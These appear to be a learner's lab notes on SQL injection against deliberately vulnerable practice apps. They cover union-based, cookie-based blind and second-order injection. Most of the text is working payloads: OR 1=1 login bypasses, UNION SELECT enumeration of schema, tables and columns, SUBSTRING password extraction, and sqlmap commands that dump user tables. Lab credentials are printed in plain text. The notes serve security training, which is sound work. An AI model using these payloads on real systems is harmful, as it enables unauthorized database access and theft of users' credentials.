***Check for everything we are supplying like username, password or even cookies***

Prompts us to enter a username

i/p : jeremy' OR 1=1#

we provide ' after jeremy to terminate the username then provide logical OR operator and write another query 1=1 which is a true statement so when the Query

Select Email From Users Where username="i/p" OR 1=1

it will always be true and we get entire DB
and we get all the user names 

Try :
i/p : jeremy' or 1=1 order by 3#
No error
i/p : jeremy' or 1=1 order by 4#
error

so there are 3 columns in that table

***When using union select, need to have same number of columns in both the tables that we are applying UNION on***

i/p : jeremy' and 1=2 union select 1,2,3 from information_schema.tables#

o/p : Username: 1 - Email: 3

**so parameter 1 and 3 are vulnerable**

i/p : jeremy' and 1=2 union select database(),2,user() from information_schema.tables#

o/p : Username: bb-labs - Email: bb-labs-user@172.19.0.4

so table_schema/database = bb-labs  and username = bb-labs-user@172.19.0.4

i/p :  jeremy' and 1=2 union select table_name,2,3 from information_schema.tables#

i/p : jeremy' and 1=2 union select table_name,2,3 from information_schema.tables where table_schema='bb-labs'#

![[sqli1.png]]

Table name = injection0x01

i/p : jeremy' and 1=2 union select column_name,2,3 from information_schema.columns where table_schema='bb-labs'#

![[sqli2.png]]


Interesting columns : username  ,  password

i/p : jeremy' and 1=2 union select username,2,password from injection0x01#


![[sqli3.png]]



---


### Blind SQL Injection


Post request, inspect it in burp suite


We get a session ID on successful login

i/p : sessionID' or 1=1#

still works

i/p : sessionID and 1=2#

dosent work

So SQL injection via HTTP header cookies


i/p : sessionID' or 1=1 order by 3#



**Order by 5 gives error so 4 columns**

i/p : sessionID' or 1=1 union select 1,2,3,4 from information_schema.tables#

***so it does validate the cookie and if given false SQL code it dosent validate the user but if given correct SQL code, it validates the user but dosent give us any tables***

***This is blind SQLi since the query dosent give us any data from the tables rather it only changes behaviour of the page***


##### Automated

Using Sqlmap

```sh
sqlmap -r req.txt --batch --level=2
```


```sh
sqlmap -r req.txt --batch --level=2 --dbs 
```

```sh
sqlmap -r req.txt --batch --level=2 -D 'peh-labs' --tables
```

```sh
sqlmap -r req.txt --batch --level=2 -D 'peh-labs' -T injection0x02 --columns
```


```sh
sqlmap -r req.txt --batch --level=2 -D 'peh-labs' -T injection0x02 --dump 
```


##### Manual

SQL substring : SUBSTRING(_string_, _start_, _length_)

i/p: ' and substring('a',1,1)='1'# if the first character of string provided in substring 'a' or not

i/p: ' and substring((select version()),1,1)='7'# put select version() in () because it has to resolve first version not 7, try 8

i/p: ' and substring((select version()),1,1)='8'#

and it is accepted so it is version 8.x.x

i/p: ' and substring((select password from injection0x02 where username='jessamy'),1,1)='a'#
i/p: ' and substring((select password from injection0x02 where username='jessamy'),1,1)='z'#

can do this uisng intruder or ffuf since we have to loop through all the characters

we got a match true for 'z'='Z' which is something to be looked carefully in SQL


---

### SQLi Lab Challenge

POST request data : pruduct : it is vulnerable to SQLi

i/p : ' and 1=1#   : works
i/p : ' and 1=2#   : dosent work

i/p : ' or 1=1#      : and we get all the items

It is verbose SQLi

**Order by 4 works, order by 5 gives error, so there are 4 columns**

i/p: senpai knife set' union select 1,2,3,4 from information_schema.tables#

**1, 2, 4  are vulnerable**

i/p : senpai knife set' union select 1,database(),3,4 from information_schema.tables#

table_schema/database = bb-labs

i/p : senpai knife set' union select 1,table_name,3,4 from information_schema.tables where table_schema='bb-labs'#

o/p : injection0x03_users

i/p : senpai knife set' union select 1,column_name,3,4 from information_schema.columns where table_schema='bb-labs'#

o/p : username, password

i/p : senpai knife set' union select 1,username,3,password from injection0x03_users#

OR

i/p : senpai knife set' union select 1,concat(username,password),3,4 from injection0x03_users#


username : takeshi   , password : onigirigadaisuki

![[sqli4.png]]


```sh
sqlmap -r req.txt -T injection0x03_users --batch --dump
```


---

### Second Order SQL Injection


Second Order Attacks : Carry out your attack normally and deliver the payload but it is not executed until later on

In lab we have an option to signup

Lets do 

username : ' or 1=1-- -    , password : test

Now login using these creds

![[secondOrderSqli.png]]


And we can see other users data

Here our input : ' or 1=1-- - isn't executed until we go to our login page

